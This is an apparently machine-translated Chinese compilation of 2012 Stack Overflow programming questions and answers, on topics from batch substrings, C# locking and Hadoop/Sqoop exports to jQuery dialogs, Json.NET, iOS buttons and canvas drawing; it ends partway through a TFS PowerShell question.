关于你看到的图标（3G、手机信号塔等），我相信操作系统*和操作系统只能*设置这种类型的通知。

# windows - 批处理脚本中的异常语句

> ID：13287051
> 
> 赞同：0
> 
> 时间：2012-11-08T10:20:30.840
> 
> 标签：windows, batch-file

我正在尝试通读 Windows 批处理脚本并在 python 中复制其功能。但是，我遇到了一个我不熟悉的声明......我自己对批处理的经验很少。

```
set variable = %variable:~-2% 
```

谁能向我解释这意味着什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:24:13.690

这将从中获取最后 2 个字符`variable`并将结果分配给`variable`.

例如：

```
SET  A=12345
ECHO %A:~-2% 
REM  This will print out "45" 
```

[请参阅此处](http://www.robvanderwoude.com/ntset.php#SubStr)的“子字符串”部分以供参考和更多示例。

# c# - C#：lock 语句中的回调函数是否也被锁定？

> ID：13287053
> 
> 赞同：4
> 
> 时间：2012-11-08T10:20:37.080
> 
> 标签：c#, asp.net, caching, thread-safety, locking

我有一个反序列化 Xml 文档并从中创建对象的函数。

我希望将对象存储到缓存中，因此每次需要从中获取数据时我都不必反序列化 xml。

```
public class XMLDeserializer
{
    public event OnElementDeserialized OnElementDeserializedCallback;

    public void DeserializeXml(string xmlPath)
    {
        // implementation
    }
}

public class XMLDeserializerFacade
{
    private static object _lockObject = new object();

    private XMLDeserializer xmlDeserializer;
    private ICacheProvider cacheProvider;
    public XMLDeserializerFacade(XMLDeserializer xmlDeserializer, ICacheProvider cacheProvider)
    {
        this.xmlDeserializer = xmlDeserializer;
        this.cacheProvider = cacheProvider;

        xmlDeserializer.OnElementDeserializedCallback += delegate(object element)
        {
            cacheProvider.Add("uniqueKey", element);
            // is here in lock as well or i have to lock it again?
        };
    }

    public void DeserializeXml(string xmlPath)
    {
        lock(_lockObject)
        {
            xmlDeserializer.DeserializeXml(xmlPath);

            // From here it will go to
            // cacheProvider.Add("uniqueKey", element);  callback
        }
    }
} 
```

当我想反序列化 xml 时，我调用

```
XMLDeserializerFacade.DeserializeXml("file.xml") 
```

我的问题是我`lock`也应该在`OnElementDeserializedCallback`回调中使用？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T10:35:03.360

这在很大程度上取决于具体的实现。如果调用它的代码与 main `lock`/位于同一线程上`DeserializeXml`，并且它使用*同步*版本（`OnElementDeserializedCallback(...)`或`OnElementDeserializedCallback.Invoke(...)`）-那么它将已经在现有锁内，因为锁本质上是与线程绑定的。

如果实现使用*异步*实现（`BeginInvoke`,`Task`等`ThreadPool`），则不：它*不会*在锁内。

如果不确定，你*可以*在两个地方都加锁（因为锁是可重入的，如果你最终从同一个线程两次嵌套锁定也没关系）；但是，如果结果证明它*是*异步的，但它还会尝试*加入回*回调（`Delegate.EndInvoke`,`Task.Wait`等），那么它可能会完全死锁。

# powershell - 无法在 powershell 中导入模块 - 无法加载文件

> ID：13287061
> 
> 赞同：0
> 
> 时间：2012-11-08T10:21:03.713
> 
> 标签：powershell

我正在尝试在我安装在我的计算机上的特定 powershell 模块中运行一个函数。通过 PowerShell 窗口运行良好，但使用 PowerGUI 时失败。

尝试执行时：

```
Import-Module modulename 
```

我遇到了异常：加载格式 dtat 文件时出错：Microsoft.PowerShell，路径：modulename.format.pslxmml：文件已跳过，因为它已经从“Microsoft.PowerShell”中出现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-17T20:16:03.423

发生这种情况是因为您在 .psm1 文件中使用了 Update-FormatData 或 Update-TypeData，这将阻止模块加载两次，因为您无法重新注册格式信息。要完成这项工作，请使用 .psd1 文件指定文件的类型和格式：

```
@{
    ModuleToProcess='MyModule.psm1'
    ModuleVersion = '1.0'
    FormatsToProcess = MyModule.Format.ps1xml'
    TypesToProcess = 'MyModule.Types.ps1xml'
} 
```

请注意，这种错误在已发布的模块中相当普遍。因此，如果您的模块没有格式化，但导入了另一个模块，那么您必须修改该模块以正确导入它的格式化程序。

# php - 使用 php 和 paypal 支付并存储在 mysql 数据库中的解决方案？

> ID：13287063
> 
> 赞同：1
> 
> 时间：2012-11-08T10:21:09.197
> 
> 标签：php, forms, post, paypal, paypal-ipn

我正在寻找一种解决方案，让访问者使用 Paypal 付款，以便在我的网站上设置广告。我希望当访问者填写表格 (POST) 然后单击 Paypal 按钮时，他们会将我的网站留在 Paypal 网站进行付款，并在成功付款后重定向到我的感谢页面，如thanks.php 和所有信息表单将存储在 mysql 数据库中。

我已经查看了 Paypal Developer site for Paypal (IPN) 上的代码示例，如果这是正确的解决方案，我现在不知道吗？

我实际上不知道使用 Paypal 成功付款后表单将如何存储在数据库中？请有人可以帮我一些代码示例，我如何在付款后将表单输入（如姓名、电子邮件、广告信息、价格和图像）存储到数据库中？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:26:45.217

您应该使用 IPN（即时付款通知）在那里您可以更新或插入值到 mysql。此页面将在完成付款后执行，它在服务器而不是用户浏览器中运行，因此它是更好的处理方式

# mercurial - 如何测量 Mercurial 存储库的磁盘空间增长率？

> ID：13287066
> 
> 赞同：0
> 
> 时间：2012-11-08T10:21:34.127
> 
> 标签：mercurial

我认为我们的 repo 增长太快是因为 mercurial 跟踪了一些二进制文件。我可以获得某种统计数据，例如按天或按周的增长率吗？

我的一个尝试是将一天的变更集导出到文件夹并检查大小，但这非常费力，没有更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T03:15:33.717

我只是将您的存储库克隆为某个修订版（例如`-r 10`），然后逐步拉取（例如`-r 20`，`-r 30`等）。在每个步骤之后测量克隆存储库的磁盘使用情况，您可以看到它是如何增长的。

这会给你一个相当粗略的估计。`hg log -d`您可以通过在原始存储库中执行以获得特定修订来改进它以更准确地为您提供每天、每周或任何其他方面的增长。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:59:19.270

最简单的方法是随时间跟踪 .hg/store 目录的总大小。您可能想要完成所有 .hg，但根据您的扩​​展，您可能会在其中包含并非真正属于“存储库”的内容（例如，hg-git 会将整个裸 git 存储库放入 .hg /git）。

# python - 如何使用python将数据从hadoop保存到数据库

> ID：13287069
> 
> 赞同：4
> 
> 时间：2012-11-08T10:21:50.013
> 
> 标签：python, xml, database, hadoop

我正在使用hadoop处理一个xml文件，所以我在python中编写了mapper文件，reducer文件。

假设需要处理的输入是**test.xml**

```
<report>
 <report-name name="ALL_TIME_KEYWORDS_PERFORMANCE_REPORT"/>
 <date-range date="All Time"/>
 <table>
  <columns>
   <column name="campaignID" display="Campaign ID"/>
   <column name="adGroupID" display="Ad group ID"/>
  </columns>
  <row campaignID="79057390" adGroupID="3451305670"/>
  <row campaignID="79057390" adGroupID="3451305670"/>
 </table>
</report> 
```

**映射器.py**文件

```
import sys
import cStringIO
import xml.etree.ElementTree as xml

if __name__ == '__main__':
    buff = None
    intext = False
    for line in sys.stdin:
        line = line.strip()
        if line.find("<row") != -1:
        .............
        .............
        .............
        print '%s\t%s'%(campaignID,adGroupID ) 
```

**reducer.py**文件

```
import sys
if __name__ == '__main__':
    for line in sys.stdin:
        print line.strip() 
```

我已经使用以下命令运行了 hadoop

```
bin/hadoop jar contrib/streaming/hadoop-streaming-1.0.4.jar 
- file /path/to/mapper.py file -mapper /path/to/mapper.py file 
-file /path/to/reducer.py file -reducer /path/to/reducer.py file 
-input /path/to/input_file/test.xml 
-output /path/to/output_folder/to/store/file 
```

当我运行上述命令时，hadoop 正在以我们在`reducer.py`文件中正确使用所需数据的格式在输出路径创建输出文件

现在毕竟我想做的是，当我运行上面的命令时，我不想将输出数据存储在由 haddop 默认创建的文本文件中，而是我想将数据保存到`MYSQL`数据库中

所以我在`reducer.py`文件中编写了一些python代码，将数据直接写入`MYSQL`数据库，并尝试通过删除输出路径来运行上述命令，如下所示

```
bin/hadoop jar contrib/streaming/hadoop-streaming-1.0.4.jar 
- file /path/to/mapper.py file -mapper /path/to/mapper.py file 
-file /path/to/reducer.py file -reducer /path/to/reducer.py file 
-input /path/to/input_file/test.xml 
```

我收到如下错误

```
12/11/08 15:20:49 ERROR streaming.StreamJob: Missing required option: output
Usage: $HADOOP_HOME/bin/hadoop jar \
          $HADOOP_HOME/hadoop-streaming.jar [options]
Options:
  -input    <path>     DFS input file(s) for the Map step
  -output   <path>     DFS output directory for the Reduce step
  -mapper   <cmd|JavaClassName>      The streaming command to run
  -combiner <cmd|JavaClassName> The streaming command to run
  -reducer  <cmd|JavaClassName>      The streaming command to run
  -file     <file>     File/dir to be shipped in the Job jar file
  -inputformat TextInputFormat(default)|SequenceFileAsTextInputFormat|JavaClassName Optional.
  -outputformat TextOutputFormat(default)|JavaClassName  Optional.
   .........................
   ......................... 
```

1.  毕竟我的疑问是如何`Database`在处理文件后保存数据？
2.  我们可以在哪个文件（mapper.py/reducer.py？）中编写将数据写入数据库的代码
3.  哪个命令用于运行 hadoop 以将数据保存到数据库中，因为当我在 hadoop 命令中删除输出文件夹路径时，它显示错误。

谁能帮我解决上述问题......

**已编辑**

**处理后**

1.  如上所述创建`mapper`和文件，它读取 xml 文件并在某个文件夹中创建一个文本文件`reducer``hadoop command`

    例如：文本文件（使用hadoop命令处理xml文件的结果）所在的文件夹如下

    /home/local/user/Hadoop/xml_processing/xml_output/part-00000

这里的 xml 文件大小是`1.3 GB`，在使用 hadoop 处理后，`text file`创建的大小是`345 MB`

现在我想做的就是`reading the text file in the above path and saving data to the mysql database`尽可能快。

我已经用基本的python尝试过这个，但是需要一些`350 sec`处理文本文件并保存到mysql数据库。

1.  现在正如nichole所指示的那样，下载了sqoop并在下面的某个路径上解压缩

    /home/local/user/sqoop-1.4.2.bin__hadoop-0.20

并进入`bin`文件夹并输入`./sqoop`，我收到以下错误

```
sh-4.2$ ./sqoop
Warning: /usr/lib/hbase does not exist! HBase imports will fail.
Please set $HBASE_HOME to the root of your HBase installation.
Warning: $HADOOP_HOME is deprecated.

Try 'sqoop help' for usage. 
```

我也试过下面

```
./sqoop export --connect jdbc:mysql://localhost/Xml_Data --username root --table PerformaceReport --export-dir /home/local/user/Hadoop/xml_processing/xml_output/part-00000 --input-fields-terminated-by '\t' 
```

**结果**

```
Warning: /usr/lib/hbase does not exist! HBase imports will fail.
Please set $HBASE_HOME to the root of your HBase installation.
Warning: $HADOOP_HOME is deprecated.

12/11/27 11:54:57 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset.
12/11/27 11:54:57 INFO tool.CodeGenTool: Beginning code generation
12/11/27 11:54:57 ERROR sqoop.Sqoop: Got exception running Sqoop: java.lang.RuntimeException: Could not load db driver class: com.mysql.jdbc.Driver
java.lang.RuntimeException: Could not load db driver class: com.mysql.jdbc.Driver
    at org.apache.sqoop.manager.SqlManager.makeConnection(SqlManager.java:636)
    at org.apache.sqoop.manager.GenericJdbcManager.getConnection(GenericJdbcManager.java:52)
    at org.apache.sqoop.manager.SqlManager.execute(SqlManager.java:525)
    at org.apache.sqoop.manager.SqlManager.execute(SqlManager.java:548)
    at org.apache.sqoop.manager.SqlManager.getColumnTypesForRawQuery(SqlManager.java:191)
    at org.apache.sqoop.manager.SqlManager.getColumnTypes(SqlManager.java:175)
    at org.apache.sqoop.manager.ConnManager.getColumnTypes(ConnManager.java:262)
    at org.apache.sqoop.orm.ClassWriter.getColumnTypes(ClassWriter.java:1235)
    at org.apache.sqoop.orm.ClassWriter.generate(ClassWriter.java:1060)
    at org.apache.sqoop.tool.CodeGenTool.generateORM(CodeGenTool.java:82)
    at org.apache.sqoop.tool.ExportTool.exportTable(ExportTool.java:64)
    at org.apache.sqoop.tool.ExportTool.run(ExportTool.java:97)
    at org.apache.sqoop.Sqoop.run(Sqoop.java:145)
    at org.apache.hadoop.util.ToolRunner.run(ToolRunner.java:65)
    at org.apache.sqoop.Sqoop.runSqoop(Sqoop.java:181)
    at org.apache.sqoop.Sqoop.runTool(Sqoop.java:220)
    at org.apache.sqoop.Sqoop.runTool(Sqoop.java:229)
    at org.apache.sqoop.Sqoop.main(Sqoop.java:238)
    at com.cloudera.sqoop.Sqoop.main(Sqoop.java:57) 
```

上述 sqoop 命令对于读取文本文件并保存到数据库的功能是否有用？，因为我们必须从文本文件中处理并插入到数据库中！！！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T11:46:28.570

我在 python 中编写了我所有的 hadoop MR 作业。我只想说你不需要使用 python 来移动数据。**使用 Sqoop**：[http ://sqoop.apache.org/](http://sqoop.apache.org/)

Sqoop 是一个开源工具，允许用户从关系数据库中提取数据到 Hadoop 中进行进一步处理。而且它的使用非常简单。你需要做的就是

1.  下载并配置 sqoop
2.  创建你的 mysql 表模式
3.  指定 hadoop hdfs 文件名、结果表名和列分隔符。

阅读本文了解更多信息： http: [//archive.cloudera.com/cdh/3/sqoop/SqoopUserGuide.html](http://archive.cloudera.com/cdh/3/sqoop/SqoopUserGuide.html)

**使用 sqoop 的优点**是我们现在可以将 hdfs 数据转换为任何类型的关系数据库（mysql、derby、hive 等），反之亦然，只需一行命令

对于您的用例，请进行必要的更改：

映射器.py

```
#!/usr/bin/env python

import sys
for line in sys.stdin:
        line = line.strip()
        if line.find("<row") != -1 :
            words=line.split(' ')
            campaignID=words[1].split('"')[1]
            adGroupID=words[2].split('"')[1]
            print "%s:%s:"%(campaignID,adGroupID) 
```

流式传输命令

```
bin/hadoop jar contrib/streaming/hadoop-streaming-1.0.4.jar - file /path/to/mapper.py file -mapper /path/to/mapper.py file -file /path/to/reducer.py file -reducer /path/to/reducer.py file -input /user/input -output /user/output 
```

mysql

```
create database test;
use test;
create table testtable ( a varchar (100), b varchar(100) ); 
```

sqoop

```
./sqoop export --connect jdbc:mysql://localhost/test --username root --table testnow --export-dir /user/output --input-fields-terminated-by ':' 
```

**注意**：

1.  请根据您的需要更改映射器
2.  我在 mapper 和 sqoop 命令中都使用了 ':' 作为我的列分隔符。根据需要更改。
3.  Sqoop 教程：我个人关注 Hadoop：权威指南（Oreilly）以及[http://archive.cloudera.com/cdh/3/sqoop/SqoopUserGuide.html](http://archive.cloudera.com/cdh/3/sqoop/SqoopUserGuide.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:46:48.247

将数据写入数据库的最佳位置是 OutputFormat。可以完成减速器级别的编写，但不是最好的事情。

如果你用 Java 写过 mapper 和 reducer，你可以使用[DBOutputFormat](http://hadoop.apache.org/docs/mapreduce/r0.21.0/api/org/apache/hadoop/mapreduce/lib/db/DBOutputFormat.html)。

因此，您可以编写一个符合您的 reducer 数据输出格式（键、值）的自定义 OutputFormat 来将数据下沉到 MySQL。

在 Yahoo Developer Network 上阅读[本](http://developer.yahoo.com/hadoop/tutorial/module5.html#outputformat)教程，了解如何编写自定义输出格式

# javascript - 带有对话框的 jQuery UI 选项卡

> ID：13287084
> 
> 赞同：1
> 
> 时间：2012-11-08T10:22:28.053
> 
> 标签：javascript, jquery, jquery-ui

我有一个带有两个选项卡的 jQuery 选项卡。每个选项卡都从两个不同的页面加载内容。父页面有一个用于 jQuery UI 对话框的 Div。

首次加载页面并单击第一个选项卡中的链接时，UI 对话框将打开并按预期完美运行。现在我转到选项卡 2，然后返回。然后我按相同的链接。UI 对话框未打开。

我正在使用 struts1 (JAVA)。

**父页面脚本**

```
$(document).ready(function() {
    $("#tabs").tabs();
    $("#addHrsDet").dialog({
        autoOpen : false,
        modal : true,
        height : 600,
        close : closeHours,
        width : 900
    });
});

<div id="addHrsDet" title="Add Minutes">
        <iframe id="addHrsDetIframe" width="100%" height="100%"
            marginWidth="0" marginHeight="0" frameBorder="0" scrolling="auto"
            title="Add Minutes">Your browser does not support</iframe>
</div> 
```

**选项卡 1**

```
function editPrjHours(prjId, menuId, prjHourId) {
    $.ajaxSetup({
        cache : false
    });
    $("#addHrsDetIframe").attr(
            "src",
            "addhrs.do?prj=" + prjId + "&menuId=" + menuId + "&prjHourId="
                    + prjHourId + "&hm=true");
    $("#addHrsDet").dialog("open");
} 
```

**选项卡 2 为空**

**编辑**

在检查 firbug 时，我看到一个错误**TypeError: $("#addHrsDet").dialog is not a function**

# c# - 使用 [JsonProperty] 将 Json 参数与 List 类型的 C# 类属性匹配

> ID：13287086
> 
> 赞同：8
> 
> 时间：2012-11-08T10:22:38.527
> 
> 标签：c#, json, json.net

我正在尝试反序列化以下 Json 响应（使用 Json.NET）：

```
[{"pollid":"1", "question":"This is a test", "start":"2011-06-28", "end":"2012-03-21", "category":"Roads", "0":"Yes", "1":"No"} … ] 
```

进入这种类型的对象：

```
 class Poll
    {
        [JsonProperty("pollid")]
        public int pollid { get; set; }
        [JsonProperty("question")]
        public string question { get; set; }
        [JsonProperty("start")]
        public DateTime start { get; set; }
        [JsonProperty("end")]
        public DateTime end { get; set; }
        [JsonProperty("category")]
        public string category { get; set; }

        // PROBLEM AREA
        [JsonProperty("0")] // Json parameter names are 0 to 9\. How can I 'match' these to the List elements?
        public List<string> polloptions { get; set; }
    } 
```

`[JsonProperty]`创建列表时如何使用该属性？（假设要包含在这个 List 中的 Json 参数名称是“0”到“9”）。在过去的几个小时里，我一直在尝试不同的方法，但没有任何运气。

非常感谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-08T20:49:29.860

一种选择是做这样的事情（我先走了`[JsonProperty("0")]`）`polloptions`：

```
int option;
Poll poll = JsonConvert.DeserializeObject<Poll>(json);
JContainer container = (JContainer)JsonConvert.DeserializeObject(json);

poll.polloptions = container.Where(t => t as JProperty != null)
    .Cast<JProperty>().Where(p => int.TryParse(p.Name, out option))
    .Select(p => p.Value.Value<string>()).ToList(); 
```

第一步是正常反序列化 - 这将处理除`polloptions`. 下一步是反序列化为 a `JContainer`，以便我们可以获取各个标记并从具有数字名称的标记中创建一个列表（因此是`int.TryParse(p.Name, out option)`）。

这将为您提供一个包含是/否值的列表。如果您还想要投票选项的名称和值，请考虑以下内容：

将属性更改`polloptions`为：

```
public List<PollOption> polloptions { get; set; } 
```

在哪里`PollOption`：

```
class PollOption
{
    public int Name { get; set; }
    public string Value { get; set; }
} 
```

反序列化时：

```
Poll poll = JsonConvert.DeserializeObject<Poll>(json);
JContainer container = (JContainer)JsonConvert.DeserializeObject(json);

var pollOptionNames = container.Where(t => t as JProperty != null)
    .Cast<JProperty>().Where(p => int.TryParse(p.Name, out option))
    .Select(p => int.Parse(p.Name)).ToList();

var pollOptionValues = container.Where(t => t as JProperty != null)
    .Cast<JProperty>().Where(p => int.TryParse(p.Name, out option))
    .Select(p => p.Value.Value<string>()).ToList();

poll.polloptions = pollOptionNames.Select((n, i) =>
    new PollOption() { Name = n, Value = pollOptionValues[i] }).ToList(); 
```

# ios - UIButtonTypeInfoLight 类型的自定义按钮

> ID：13287088
> 
> 赞同：0
> 
> 时间：2012-11-08T10:22:43.037
> 
> 标签：ios, uibutton, selector, mkannotationview

我创建了一个自定义按钮，为什么我需要在@selector 中作为参数传递。自定义按钮是 annotationView 的一部分。在 CustomButton 中，我将其作为属性 UIButtonType，但在输出中什么也没有出现。输出是一个没有任何内容的按钮，当我想要打开视图控制器时，当我在注释内部进行修饰时会消失。

这是 CustomButton.h 中的代码

```
@interface CustomButton : UIButton{

}

@property (nonatomic, strong)NSString * name;
@property (nonatomic, assign)UIButtonType  typeButton;
@end 
```

在 CustomButton.m

```
@implementation CustomButton.h

@synthesize name;
@synthesize buttonType;

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {

         self.typeButton = UIButtonTypeInfoLight;

    }
return self;
} 
```

在 MapViewController.m

```
 -(void)loadDetailListViewController: (CustomButton *)aName{ 

             //I want to open a viewController 
             //.......
  }

 - (MKAnnotationView *)mapView:(MKMapView *)mapview viewForAnnotation:(id 
 <MKAnnotation>)annotation
  {
       //.......  

       MKPinAnnotationView *annotationView = (MKPinAnnotationView*) [mapView 
                dequeueReusableAnnotationViewWithIdentifier:AnnotationIdentifier];

       annotationView = [[MKPinAnnotationView alloc] initWithAnnotation:annotation
                                                  reuseIdentifier:AnnotationIdentifier];

     //.........

     CustomButton *rightButton = [CustomButton buttonWithType:UIButtonTypeCustom];
     [rightButton setName:[NSString stringWithFormat:@"%@", self.nameTable]];

     [rightButton addTarget:self action: @selector(loadDetailListViewController:) 
                                forControlEvents:UIControlEventTouchUpInside];

     annotationView.rightCalloutAccessoryView = rightButton;
     annotationView.canShowCallout = YES;
     annotationView.draggable = YES;
     return annotationView;
   } 
```

为什么当我触摸里面的注解消失了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T14:43:42.240

请务必遵循文档说明：

> buttonWithType：创建并返回指定类型的新按钮。
> 
> *   (id)buttonWithType:(UIButtonType)buttonType
> 
> 参数
> 
> buttonType 按钮类型。有关可能的值，请参见 UIButtonType。
> 
> 返回值
> 
> 一个新创建的按钮。
> 
> 讨论 此方法是一种方便的构造函数，用于创建具有特定配置的按钮对象。**如果您将 UIButton 子类化，** **则此方法不会返回您的子类的实例。如果要** **创建特定子类的实例，则必须** **直接分配/初始化按钮。**
> 
> 创建自定义按钮（即 UIButtonTypeCustom 类型的按钮）时，按钮的框架最初设置为 (0, 0, 0, 0)。在将按钮添加到界面之前，您应该将框架更新为更合适的值。

当您使用`UIButtonTypeCustom`at 时，您的代码会以某种方式工作，如果有人更改它（例如 to ）`buttonWithType:`，就会发生不好的事情。`UIButtonTypeRoundedRect`

由于您没有`CustomButton -initWithFrame:`在代码中的任何地方使用但提供了它的实现，我可以建议您将它用作所需的初始化程序，这很好。

# javascript - 使用 Javascript 进行背景翻转平铺

> ID：13287090
> 
> 赞同：4
> 
> 时间：2012-11-08T10:22:44.963
> 
> 标签：javascript, html, css

我有一个当前垂直重复并位于页面中心的背景图像。这是一些描述图像的 ASCII 艺术，标有左侧和右侧。

```
----------
|        |
|        |
|L      R|
|        |
|        |
---------- 
```

我希望通过每次沿垂直边缘翻转图像来在整个浏览器窗口中重复图像：

```
----------------------------------------
|        ||        ||        ||        |
|        ||        ||        ||        |
|L      R||R      L||L      R||R      L|
|        ||        ||        ||        |
|        ||        ||        ||        |
---------------------------------------- 
```

现在，我可以创建一个像下面这样的图像，并使用 CSS 重复它：

```
--------------------
|        ||        |
|        ||        |
|L      R||R      L|
|        ||        |
|        ||        |
-------------------- 
```

然而，这个图像已经比我想要的大得多，所以把它放大 2 倍是不可能的（特别是因为我也计划有一个视网膜版本！）。我认为在 Javascript 中执行此操作可能是一个很好的折衷方案。

有谁知道已经可以处理这个问题的 JS 库，或者指向我一个可以给我一个不错的开始的资源？

谢谢，

蒂姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:25:52.893

您可以在[大多数浏览器](http://caniuse.com/#feat=transforms2d)上通过[`transform`](http://www.w3.org/TR/css3-transforms/)属性使用 CSS 执行此操作（对于较旧的 IE，可以使用后备`filter`）；[文章在这里](http://css-tricks.com/snippets/css/flip-an-image/)。例如：

```
img.flipped {
    -moz-transform:    scaleX(-1);
    -o-transform:      scaleX(-1);
    -webkit-transform: scaleX(-1);
    transform:         scaleX(-1);
    filter:            FlipH;
    -ms-filter:        "FlipH";
} 
```

[现场示例](http://jsbin.com/evagan/1) *（使用您的 gravatar）* | [来源](http://jsbin.com/evagan/1/edit)

由于后备过滤器，它甚至可以在 IE6 中使用。哇。当然，IE9（`transform`支持）、Chrome、Firefox、Opera……

*为背景*做这件事可能会有点痛苦，可能需要绝对定位和负 z-index，但是......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:28:48.377

您可以使用 CSS3 来翻转图像，但它只适用于现代浏览器。

看看这个问题和批准的答案：[点击这里](https://stackoverflow.com/q/5768998/1145124)

# python - 从 PdfFileWriter 创建 blobstore 文件

> ID：13287091
> 
> 赞同：2
> 
> 时间：2012-11-08T10:22:49.333
> 
> 标签：python, file, google-app-engine, blobstore, pypdf

我正在尝试使用 python 和谷歌应用引擎将两个 pdf 与 pyPdf 库合并。我从 blobstore 读取文件，并使用我需要的信息创建 PdfFileWriter 对象，但是在将这个 PdfFileWriter 转换为 blobstore 文件时遇到了麻烦。有什么办法解决吗？谢谢 ：）

这是我的代码：

```
blob_reader1 = blobstore.BlobReader(blob_key1)
blob_reader2 = blobstore.BlobReader(blob_key2)

writer = PdfFileWriter()

input1 = PdfFileReader(blob_reader1)
input2 = PdfFileReader(blob_reader2)

writer.addPage(input1.getPage(0))
writer.addPage(input1.getPage(1))
writer.addPage(input2.getPage(0))

# finally, write "output" to document-output.pdf
# This lines are comment because it is the way to do it without google app engine---
# outputStream = file("document-output.pdf", "wb")
# output.write(outputStream)
# outputStream.close()
#        
# Open the file and write to it
#I do not how write the information are inside writer in blobstore file
file_name = files.blobstore.create(mime_type='application/pdf')    
#with files.open(file_name, 'a') as f:
#    f.write(writer) it does not work

# Finalize the file. Do this before attempting to read it.
files.finalize(file_name)

blob_key = files.blobstore.get_blob_key(file_name) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:02:52.517

您可以尝试将数据输出到字符串缓冲区，然后将缓冲区写入 blob 文件：

```
import StringIO

stream = StringIO.StringIO()
writer.write( stream )    # write PDF content

# Open the file and write to it
with files.open(file_name, 'a') as f:
    f.write( stream.getvalue() ) 
```

然后完成并做通常的事情。

# iphone - 使用 SDWebImage IOS 管理服务器上的图像更改

> ID：13287094
> 
> 赞同：2
> 
> 时间：2012-11-08T10:22:53.873
> 
> 标签：iphone, objective-c, ios, caching, sdwebimage

我喜欢这个类似的[问题](https://stackoverflow.com/questions/6053416/what-happens-to-sdwebimage-cached-images-in-my-app-when-the-image-file-on-the-se/7315149#7315149 "例子")，但它太老了。

我正在使用 SDWebImage 库从远程服务器下载图像。

远程图像可能会更改（但保持相同的名称），因此我必须在使用缓存的图像之前检查远程图像是否已更改。

我怎样才能做到这一点？

提前致谢（抱歉英语不好）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-29T22:08:13.373

我这样做是使用：

```
[SDWebImage sd_setImageWithURL:[NSURL URLWithString:strURL] placeholderImage:[UIImage imageNamed:@"placeholder.png"] options:SDWebImageRefreshCached]; 
```

> /** * 即使图像被缓存，也要遵守 HTTP 响应缓存控制，并在需要时从远程位置刷新图像。* 磁盘缓存将由 NSURLCache 而不是 SDWebImage 处理，导致性能略有下降。* 此选项有助于处理在同一请求 URL 后面更改的图像，例如 Facebook graph api profile pics。* 如果缓存的图像被刷新，完成块被缓存的图像调用一次，最终的图像被调用一次。* * 仅当您无法使用嵌入的缓存清除参数使您的 URL 成为静态时才使用此标志。*/

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-03T04:12:38.580

我今晚只是在做这项非常研究，并且基于 SDWebImage 的当前实现，看起来没有“内置”方式来使用对服务器的条件 GET（etag 或日期）类型请求来检查更新。

我现在正在探索的方式是创建一个唯一的 URL，以便在图像的服务器版本更新时，将哈希或版本附加到末尾。就像是：

[http://example.com/myimage.png?v=2](http://example.com/myimage.png?v=2)

并随着图像的变化增加该版本号，但保持 myimage.png 名称相同，因为它不会改变。这应该会强制 SDWebImage 下载新图像并为新版本的图像构建新缓存。

否则，您必须调整`cacheMaxCacheAge`SDImageCache.m 中的常量值以比其默认值 1 周更频繁地检查。

# javascript - Canvas 的阅读风格 (html5,js)

> ID：13287097
> 
> 赞同：0
> 
> 时间：2012-11-08T10:23:04.340
> 
> 标签：javascript, jquery, html, canvas

我有一个用户进行交互的画布，然后是`<img>`最终的“产品”。标记的`<img>`样式正确填充了第一个画布的数据 URI。

我现在需要获取这个“画布”作为元素，然后将其转换为画布对象。例子：

```
var canvas = parent.document.getElementById('canvas_holder');
var context = canvas.getContext("2d");
context.strokeStyle = '#f00';
//etc... 
```

*canvas_holder* 是`<img>`样式设置为真实画布数据 URI 的标签。我将如何使这种想法发挥作用？不幸的是，我**无法**更改 的结构。`<img>`

感谢任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T12:29:29.697

您不需要弄乱图像的 base64 编码版本。只需使用

```
var img = document.getElementById('myImage'); // your <img>   

var can = document.getElementById('myCanvas'); // your <canvas>
can.width = img.width;
can.height = img.height;
var ctx = can.getContext('2d');

ctx.drawImage(img, 0, 0, img.width, img.height); // draw the image onto the canvas 
```

这应该将图像绘制到画布上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T09:01:53.787

我认为 OP 想告诉我们图像是前景图像`transparent.png`和背景图像的组合，由其 base64 编码版本表示。我看到的唯一方法是从

```
var image = new Image();
image.src = $('#canvas_holder').css('background-image').match(/url\("?'?(.*)"?'?\)/)[1];
//  If you don't want to use jQuery, you could get the background-image as
// image.src = document.getElementById('canvas_holder').style.backgroundImage.match(/url\("?'?(.*)"?'?\)/)[1]; 
```

并将其粘贴到画布上。

```
var canvas = document.getElementById('yourcanvasid');
var ctx = canvas.getContext('2d');
ctx.drawImage(image, 0, 0); 
```

然后获取前景图像并将其粘贴到同一个画布上

```
var foreGround = document.getElementById('canvas_holder');
ctx.drawImage(foreGround, 0, 0); 
```

# tfsbuild - 在 TFS 2010 构建服务器上构建完成后 PowerShell 脚本失败

> ID：13287101
> 
> 赞同：0
> 
> 时间：2012-11-08T10:23:20.593
> 
> 标签：tfsbuild

我使用 TFS 2010 作为构建服务器，并且我已修改构建模板以在构建编译时调用 powershell 脚本，使用调用进程项。

我遇到的问题是，如果我在 TFS 服务器（使用用于运行构建服务的同一帐户登录）上手动运行脚本（必须说具有提升的权限），脚本运行良好，但它不能完全运行。

下面的脚本，我用于测试，输出所有“回声”，但它不创建文件。我已经检查了目录的权限并且用户拥有完全控制权。

事件日志或 TFS 上没有错误。

有任何想法吗？

TIA

```
echo "Start script"

echo "Get Date"

$filename = (Get-Date).ToString("yyyyMMdd_HHmm")+ ".txt"

echo "Write Date to file"

